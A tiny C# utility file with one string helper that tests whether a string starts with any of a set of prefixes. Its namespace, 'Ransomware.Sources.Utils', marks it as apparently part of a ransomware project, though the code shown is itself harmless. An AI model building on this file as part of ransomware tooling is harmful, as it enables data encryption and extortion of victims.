

namespace Ransomware.Sources.Utils;
static class Extensions
{
    public static bool StartsWithAny(this string str, HashSet<string> prefixes)
    {
        // Kiểm tra xem chuỗi có bắt đầu bằng bất kỳ tiền tố nào không
        return prefixes.Any(prefix => str.StartsWith(prefix, StringComparison.OrdinalIgnoreCase));
    }
}
